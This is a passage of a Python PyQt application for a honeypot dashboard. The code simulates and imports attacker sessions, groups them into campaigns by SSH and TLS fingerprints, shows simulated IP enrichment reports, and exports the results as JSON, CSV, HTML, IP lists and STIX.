            self.statusBar().showMessage(f"HTTP honeypot started on port {self.http_port_spin.value()}")
        else:
            self.btn_http_start.setEnabled(True)
            self.btn_http_stop.setEnabled(False)
            self.http_status.setText("OFF")
            self.http_status.setStyleSheet("color: gray; font-weight: bold;")
            self.statusBar().showMessage("HTTP honeypot stopped")

    def _load_demo_data(self):
        self.sessions = generate_demo_data(25)
        self._assign_campaigns()
        self._refresh_all()
        self.statusBar().showMessage(f"Loaded {len(self.sessions)} demo sessions")
        self._log_live_event("[SYSTEM] Demo data loaded successfully")

    def _import_data(self):
        path, _ = QFileDialog.getOpenFileName(
            self, "Import Session Data", "", "JSON Files (*.json);;All Files (*)"
        )
        if not path:
            return
        try:
            with open(path, "r", encoding="utf-8") as f:
                data = json.load(f)
            if isinstance(data, list):
                self.sessions.extend(data)
            elif isinstance(data, dict) and "sessions" in data:
                self.sessions.extend(data["sessions"])
            self._assign_campaigns()
            self._refresh_all()
            self.statusBar().showMessage(f"Imported {len(data) if isinstance(data, list) else len(data.get('sessions', []))} sessions")
            self._log_live_event(f"[SYSTEM] Data imported from {os.path.basename(path)}")
        except Exception as e:
            QMessageBox.warning(self, "Import Error", f"Failed to import data:\n{str(e)}")

    def _clear_data(self):
        self.sessions.clear()
        self.campaigns.clear()
        self.threat_intel.clear()
        self.event_counter = 0
        self._refresh_all()
        self.live_traffic.clear()
        self.statusBar().showMessage("All data cleared")
        self._log_live_event("[SYSTEM] All data cleared")

    # ---- Live Simulation ----
    def _start_live_simulation(self):
        self.btn_start_live.setEnabled(False)
        self.btn_stop_live.setEnabled(True)
        self.demo_timer.start(self.event_rate_spin.value())
        self.statusBar().showMessage("Live simulation started")
        self._log_live_event("[SYSTEM] Live simulation started")

    def _stop_live_simulation(self):
        self.btn_start_live.setEnabled(True)
        self.btn_stop_live.setEnabled(False)
        self.demo_timer.stop()
        self.statusBar().showMessage("Live simulation stopped")
        self._log_live_event("[SYSTEM] Live simulation stopped")

    def _generate_live_event(self):
        session = generate_random_session()
        self.sessions.append(session)
        self.event_counter += 1
        self.live_event_count.setText(f"Events: {self.event_counter}")

        proto = session["protocol"]
        ip = session["source_ip"]
        risk = session["risk_score"]

        risk_str = get_risk_label(risk)
        if proto == "SSH":
            msg = (f"[{session['timestamp'][:19]}] {proto} connection from {ip}:{session['source_port']} "
                   f"| User: {session['username']} | Risk: {risk_str}({risk}) | "
                   f"HASSH: {session['hassh'][:12]}...")
        else:
            msg = (f"[{session['timestamp'][:19]}] {proto} request from {ip}:{session['source_port']} "
                   f"| UA: {session['user_agent'][:40]}... | Risk: {risk_str}({risk}) | "
                   f"JA3: {session['ja3'][:12]}...")

        self._log_live_event(msg, risk)

        if risk >= 70:
            self._log_live_event(f"  >> HIGH RISK: {ip} - {get_risk_label(risk)} activity detected", risk)

        if session.get("commands"):
            self._log_live_event(f"  >> Commands: {', '.join(session['commands'][:3])}", risk)

        self._refresh_all()

    def _log_live_event(self, msg, risk=0):
        color = "#d4d4d4"
        if risk >= 70:
            color = "#f44747"
        elif risk >= 40:
            color = "#cca700"
        elif risk >= 20:
            color = "#dcdcaa"

        self.live_traffic.appendHtml(
            f'<span style="color:{color}">{msg}</span>'
        )
        cursor = self.live_traffic.textCursor()
        cursor.movePosition(QTextCursor.End)
        self.live_traffic.setTextCursor(cursor)

    # ---- Campaign Logic ----
    def _assign_campaigns(self):
        fp_groups = defaultdict(list)
        for s in self.sessions:
            fp = s.get("hassh") or s.get("ja3") or s.get("http_fp", "")[:16]
            fp_groups[fp].append(s)

        self.campaigns.clear()
        for fp, group in fp_groups.items():
            ips = sorted(set(s["source_ip"] for s in group))
            c_id = f"camp-{fp[:8]}"
            self.campaigns[c_id] = {
                "campaign_id": c_id,
                "name": f"Campaign {fp[:8]}",
                "fingerprint": fp,
                "source_ips": ips,
                "sessions": [s["session_id"] for s in group],
                "first_seen": min(s["timestamp"] for s in group),
                "last_seen": max(s["timestamp"] for s in group),
                "threat_level": get_risk_label(max(s["risk_score"] for s in group))
            }

    # ---- IP Enrichment ----
    def _lookup_ip(self):
        ip = self.ip_search.text().strip()
        if not ip:
            return

        related = [s for s in self.sessions if s["source_ip"] == ip]
        if not related:
            self.ip_enrichment_text.setPlainText(f"No sessions found for {ip}")
            return

        # Simulated enrichment
        abuse_score = random.randint(0, 100)
        vt_malicious = random.randint(0, 20)
        gn_class = random.choice(["malicious", "benign", "unknown"])

        lines = [
            f"=== IP Enrichment Report: {ip} ===",
            f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            "",
            "--- AbuseIPDB (simulated) ---",
            f"  Abuse Confidence Score: {abuse_score}%",
            f"  Total Reports: {random.randint(1, 200)}",
            f"  Country: {random.choice(['US', 'CN', 'RU', 'DE', 'BR', 'IN'])}",
            f"  ISP: {random.choice(['DigitalOcean', 'AWS', 'OVH', 'Cloudflare', 'Unknown'])}",
            f"  Usage: {random.choice(['Data Center', 'Residential', 'Hosting'])}",
            "",
            "--- VirusTotal (simulated) ---",
            f"  Malicious Detections: {vt_malicious}/90",
            f"  Harmless: {90 - vt_malicious}",
            f"  Engine Detections: {', '.join(random.sample(['Kaspersky', 'BitDefender', 'ESET', 'Symantec', 'McAfee'], min(vt_malicious, 5)))}",
            "",
            "--- GreyNoise (simulated) ---",
            f"  Classification: {gn_class}",
            f"  Noise: {'Yes' if gn_class == 'malicious' else 'No'}",
            f"  RIOT: {'Yes' if gn_class == 'benign' else 'No'}",
            f"  Tags: {', '.join(random.sample(['SSH Brute Force', 'Web Scanner', 'C2', 'Botnet', 'Tor Exit Node', 'VPN'], 3))}",
            "",
            "--- Local Honeypot Data ---",
            f"  Total Sessions: {len(related)}",
            f"  Protocols: {', '.join(set(s['protocol'] for s in related))}",
            f"  Avg Risk Score: {sum(s['risk_score'] for s in related) / len(related):.1f}",
            f"  Max Risk Score: {max(s['risk_score'] for s in related)}",
            f"  Fingerprints: {', '.join(set(s.get('hassh') or s.get('ja3') or '' for s in related))}",
            f"  Usernames Tried: {', '.join(set(s.get('username', '') for s in related if s.get('username')))}",
        ]
        self.ip_enrichment_text.setPlainText("\n".join(lines))

    def _refresh_ip_summary(self):
        ip_stats = defaultdict(lambda: {"count": 0, "risks": [], "protos": set()})
        for s in self.sessions:
            ip = s["source_ip"]
            ip_stats[ip]["count"] += 1
            ip_stats[ip]["risks"].append(s["risk_score"])
            ip_stats[ip]["protos"].add(s["protocol"])

        rows = sorted(ip_stats.items(), key=lambda x: max(x[1]["risks"]), reverse=True)
        self.ip_summary_table.setRowCount(len(rows))
        for i, (ip, stats) in enumerate(rows):
            avg_risk = sum(stats["risks"]) / len(stats["risks"])
            max_risk = max(stats["risks"])
            cat = "Scanner" if ip in KNOWN_SCANNERS else "High Risk" if max_risk >= 70 else "Suspicious" if avg_risk >= 30 else "Low Risk"

            items = [
                QTableWidgetItem(ip),
                QTableWidgetItem(str(stats["count"])),
                QTableWidgetItem(f"{avg_risk:.0f}"),
                QTableWidgetItem(str(max_risk)),
                QTableWidgetItem(cat)
            ]
            for j, item in enumerate(items):
                self.ip_summary_table.setItem(i, j, item)
                color = get_risk_color(max_risk)
                item.setForeground(color)

    # ---- Table Population ----
    def _apply_filters(self):
        self._refresh_session_table()

    def _refresh_session_table(self):
        filtered = list(self.sessions)
        fip = self.filter_ip.text().strip()
        if fip:
            filtered = [s for s in filtered if fip in s["source_ip"]]
        fproto = self.filter_proto.currentText()
        if fproto != "All":
            filtered = [s for s in filtered if s["protocol"] == fproto]
        frisk = self.filter_risk.value()
        if frisk > 0:
            filtered = [s for s in filtered if s["risk_score"] >= frisk]

        self.session_table.setRowCount(len(filtered))
        for i, s in enumerate(filtered):
            cmds = "\n".join(s.get("commands", [])[:3]) if s.get("commands") else "-"
            fp = s.get("hassh", "") or s.get("ja3", "") or s.get("http_fp", "")[:16] + "..."

            items = [
                QTableWidgetItem(s["timestamp"][:19]),
                QTableWidgetItem(s["source_ip"]),
                QTableWidgetItem(s["protocol"]),
                QTableWidgetItem(s.get("hassh", "-")[:16] + ("..." if s.get("hassh") else "")),
                QTableWidgetItem(s.get("ja3", "-")[:16] + ("..." if s.get("ja3") else "")),
                QTableWidgetItem(s.get("username", "-")),
                QTableWidgetItem(s.get("password", "-")),
                QTableWidgetItem(cmds),
                QTableWidgetItem(str(s["risk_score"])),
                QTableWidgetItem(s.get("user_agent", "-")[:40]),
                QTableWidgetItem(s["session_id"][:8])
            ]

            risk = s["risk_score"]
            color = get_risk_color(risk)
            for j, item in enumerate(items):
                self.session_table.setItem(i, j, item)
                if j == 8:
                    item.setForeground(color)
                    item.setText(get_risk_label(risk) + f"({risk})")
                elif j == 1:
                    if s["source_ip"] in KNOWN_SCANNERS:
                        item.setForeground(QColor(230, 100, 30))
                    else:
                        item.setForeground(color)

        self.statusBar().showMessage(f"Showing {len(filtered)} of {len(self.sessions)} sessions")

    def _show_session_detail(self):
        indexes = self.session_table.selectionModel().selectedRows()
        if not indexes:
            return
        row = indexes[0].row()
        sid_item = self.session_table.item(row, 10)
        if not sid_item:
            return
        sid = sid_item.text()
        session = None
        for s in self.sessions:
            if s["session_id"].startswith(sid):
                session = s
                break
        if not session:
            return

        lines = [
            f"Session ID: {session['session_id']}",
            f"Timestamp: {session['timestamp']}",
            f"Source: {session['source_ip']}:{session['source_port']}",
            f"Protocol: {session['protocol']}",
            f"Risk Score: {session['risk_score']} ({get_risk_label(session['risk_score'])})",
            f"Campaign: {session.get('campaign_id', 'N/A')}",
        ]
        if session.get("hassh"):
            lines.append(f"\nHASSH: {session['hassh']}")
            lines.append(f"Known as: {KNOWN_HASSH.get(session['hassh'], 'Unknown client')}")
        if session.get("ja3"):
            lines.append(f"\nJA3: {session['ja3']}")
            lines.append(f"Known as: {KNOWN_JA3.get(session['ja3'], 'Unknown client')}")
        if session.get("http_fp"):
            lines.append(f"\nHTTP FP: {session['http_fp']}")
        if session.get("username"):
            lines.extend([f"\nCredentials:", f"  Username: {session['username']}", f"  Password: {session['password']}"])
        if session.get("commands"):
            lines.append(f"\nCommands ({len(session['commands'])}):")
            for c in session["commands"]:
                lines.append(f"  > {c}")
        if session.get("user_agent"):
            lines.extend([f"\nUser-Agent:", f"  {session['user_agent']}"])
            is_scanner, tool = analyze_user_agent(session["user_agent"])
            if is_scanner:
                lines.append(f"  ** Detected as: {tool} **")
        if session.get("headers"):
            lines.append(f"\nHeaders:")
            for k, v in session["headers"].items():
                lines.append(f"  {k}: {v}")

        self.session_detail.setPlainText("\n".join(lines))

    def _refresh_fingerprints(self):
        # HASSH
        hassh_counts = defaultdict(lambda: {"count": 0, "desc": ""})
        for s in self.sessions:
            h = s.get("hassh", "")
            if h:
                hassh_counts[h]["count"] += 1
                hassh_counts[h]["desc"] = KNOWN_HASSH.get(h, "Unknown")

        rows = sorted(hassh_counts.items(), key=lambda x: x[1]["count"], reverse=True)
        self.hassh_table.setRowCount(len(rows))
        for i, (h, data) in enumerate(rows):
            self.hassh_table.setItem(i, 0, QTableWidgetItem(h))
            self.hassh_table.setItem(i, 1, QTableWidgetItem(data["desc"]))
            self.hassh_table.setItem(i, 2, QTableWidgetItem(str(data["count"])))

        # JA3
        ja3_counts = defaultdict(lambda: {"count": 0, "desc": ""})
        for s in self.sessions:
            j = s.get("ja3", "")
            if j:
                ja3_counts[j]["count"] += 1
                ja3_counts[j]["desc"] = KNOWN_JA3.get(j, "Unknown")

        rows2 = sorted(ja3_counts.items(), key=lambda x: x[1]["count"], reverse=True)
        self.ja3_table.setRowCount(len(rows2))
        for i, (j, data) in enumerate(rows2):
            self.ja3_table.setItem(i, 0, QTableWidgetItem(j))
            self.ja3_table.setItem(i, 1, QTableWidgetItem(data["desc"]))
            self.ja3_table.setItem(i, 2, QTableWidgetItem(str(data["count"])))

    def _refresh_campaigns(self):
        rows = sorted(self.campaigns.values(), key=lambda c: len(c["sessions"]), reverse=True)
        self.campaign_table.setRowCount(len(rows))
        for i, c in enumerate(rows):
            tl = c["threat_level"]
            tl_item = QTableWidgetItem(tl)
            color = QColor(220, 50, 50) if tl == "CRITICAL" else QColor(230, 150, 30) if tl == "HIGH" else QColor(200, 200, 50) if tl == "MEDIUM" else QColor(50, 180, 50)
            tl_item.setForeground(color)

            items = [
                QTableWidgetItem(c["name"]),
                QTableWidgetItem(c["fingerprint"][:16] + "..."),
                QTableWidgetItem(str(len(c["source_ips"]))),
                QTableWidgetItem(str(len(c["sessions"]))),
                QTableWidgetItem(c["first_seen"][:19]),
                tl_item
            ]
            for j, item in enumerate(items):
                self.campaign_table.setItem(i, j, item)

    def _show_campaign_detail(self):
        indexes = self.campaign_table.selectionModel().selectedRows()
        if not indexes:
            return
        row = indexes[0].row()
        name_item = self.campaign_table.item(row, 0)
        if not name_item:
            return
        name = name_item.text()
        campaign = None
        for c in self.campaigns.values():
            if c["name"] == name:
                campaign = c
                break
        if not campaign:
            return

        lines = [
            f"Campaign: {campaign['name']}",
            f"ID: {campaign['campaign_id']}",
            f"Fingerprint: {campaign['fingerprint']}",
            f"Threat Level: {campaign['threat_level']}",
            f"First Seen: {campaign['first_seen']}",
            f"Last Seen: {campaign['last_seen']}",
            f"\nSource IPs ({len(campaign['source_ips'])}):",
        ]
        for ip in campaign["source_ips"]:
            lines.append(f"  - {ip}")
        lines.append(f"\nSessions ({len(campaign['sessions'])}):")
        for sid in campaign["sessions"][:10]:
            lines.append(f"  - {sid[:12]}...")
        if len(campaign["sessions"]) > 10:
            lines.append(f"  ... and {len(campaign['sessions']) - 10} more")

        self.campaign_detail.setPlainText("\n".join(lines))

    def _refresh_stats(self):
        total = len(self.sessions)
        ssh = sum(1 for s in self.sessions if s["protocol"] == "SSH")
        http = total - ssh
        high_risk = sum(1 for s in self.sessions if s["risk_score"] >= 70)
        unique_ips = len(set(s["source_ip"] for s in self.sessions))

        self.stat_total.setText(str(total))
        self.stat_ssh.setText(str(ssh))
        self.stat_http.setText(str(http))
        self.stat_high_risk.setText(str(high_risk))
        self.stat_unique_ips.setText(str(unique_ips))
        self.stat_campaigns.setText(str(len(self.campaigns)))

    def _refresh_all(self):
        self._refresh_session_table()
        self._refresh_fingerprints()
        self._refresh_ip_summary()
        self._refresh_campaigns()
        self._refresh_stats()
        self._update_report_preview()

    def _update_report_preview(self):
        if not self.sessions:
            self.report_preview.setPlainText("No sessions loaded. Load demo data or import a file to preview.")
            return
        lines = [
            f"=== Honeypot Report Preview ===",
            f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            f"Total Sessions: {len(self.sessions)}",
            f"Campaigns: {len(self.campaigns)}",
            "",
            "--- Top Attackers by Risk ---"
        ]
        top = sorted(self.sessions, key=lambda s: s["risk_score"], reverse=True)[:10]
        for s in top:
            lines.append(f"  {s['source_ip']:20s} Risk:{s['risk_score']:3d} ({get_risk_label(s['risk_score']):8s}) {s['protocol']:4s} {s.get('username', s.get('user_agent', '-'))[:20]}")
        lines.extend([
            "",
            "--- Fingerprints Summary ---"
        ])
        fp_set = set()
        for s in self.sessions:
            fp = s.get("hassh") or s.get("ja3") or s.get("http_fp", "")[:16]
            fp_set.add(fp)
        for fp in sorted(fp_set):
            count = sum(1 for s in self.sessions if (s.get("hassh") or s.get("ja3") or s.get("http_fp", "")[:16]) == fp)
            desc = KNOWN_HASSH.get(fp, KNOWN_JA3.get(fp, "Custom"))
            lines.append(f"  {fp[:20]}... {count:3d} sessions  ({desc})")

        self.report_preview.setPlainText("\n".join(lines))

    # ---- Export ----
    def _export_json(self):
        if not self.sessions:
            QMessageBox.information(self, "Export", "No sessions to export.")
            return
        path, _ = QFileDialog.getSaveFileName(self, "Export JSON", "honeypot_sessions.json", "JSON (*.json)")
        if path:
            export_json(self.sessions, path)
            self.statusBar().showMessage(f"Exported {len(self.sessions)} sessions to {path}")

    def _export_csv(self):
        if not self.sessions:
            QMessageBox.information(self, "Export", "No sessions to export.")
            return
        path, _ = QFileDialog.getSaveFileName(self, "Export CSV", "honeypot_sessions.csv", "CSV (*.csv)")
        if path:
            export_csv(self.sessions, path)
            self.statusBar().showMessage(f"Exported {len(self.sessions)} sessions to {path}")

    def _export_html(self):
        if not self.sessions:
            QMessageBox.information(self, "Export", "No sessions to export.")
            return
        path, _ = QFileDialog.getSaveFileName(self, "Export HTML", "honeypot_report.html", "HTML (*.html)")
        if path:
            export_html(self.sessions, path)
            self.statusBar().showMessage(f"Exported HTML report to {path}")

    def _export_ip_list(self):
        if not self.sessions:
            QMessageBox.information(self, "Export", "No sessions to export.")
            return
        path, _ = QFileDialog.getSaveFileName(self, "Export IP List", "captured_ips.txt", "Text (*.txt)")
        if path:
            export_ip_list(self.sessions, path)
            self.statusBar().showMessage(f"Exported IP list to {path}")

    def _export_stix(self):
        if not self.sessions:
            QMessageBox.information(self, "Export", "No sessions to export.")
            return
        path, _ = QFileDialog.getSaveFileName(self, "Export STIX", "honeypot_indicators.json", "JSON (*.json)")
        if path:
            export_stix(self.sessions, path)
            self.statusBar().showMessage(f"Exported STIX bundle to {path}")


# ============================================================================
# MAIN
# ============================================================================

def main():
    app = QApplication(sys.argv)
    app.setStyle("Fusion")

    palette = QPalette()
    palette.setColor(QPalette.Window, QColor(30, 30, 30))
    palette.setColor(QPalette.WindowText, QColor(212, 212, 212))
    palette.setColor(QPalette.Base, QColor(30, 30, 30))
    palette.setColor(QPalette.AlternateBase, QColor(45, 45, 45))
    palette.setColor(QPalette.Text, QColor(212, 212, 212))
    palette.setColor(QPalette.Button, QColor(51, 51, 51))
    palette.setColor(QPalette.ButtonText, QColor(212, 212, 212))
    palette.setColor(QPalette.Highlight, QColor(38, 79, 120))
    palette.setColor(QPalette.HighlightedText, QColor(255, 255, 255))
    app.setPalette(palette)

    font = QFont("Segoe UI", 10)
    app.setFont(font)

    window = HoneypotGUI()
    window.show()

    # Auto-load demo data on startup
    window._load_demo_data()

    sys.exit(app.exec())


if __name__ == "__main__":
    main()
